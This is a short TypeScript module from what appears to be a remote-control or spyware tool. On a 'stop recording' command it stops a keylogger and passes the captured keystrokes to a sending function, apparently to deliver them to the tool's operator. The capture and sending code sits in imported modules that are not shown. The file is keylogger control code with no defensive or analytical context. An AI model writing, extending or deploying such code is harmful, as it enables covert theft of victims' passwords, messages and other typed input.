import { stopKeylogger } from "./keyLogger";
import { logger } from "../../../src/utils/logger";
import { sendAsHTMLOrText } from "./sendAsHTMLOrText";

export const stopRecordingKeyboard = async () => {
  const res = stopKeylogger();
  logger.log("GOT STOP RECORDING COMMAND", res);

  if (res) {
    await sendAsHTMLOrText(null, res);
  }
};
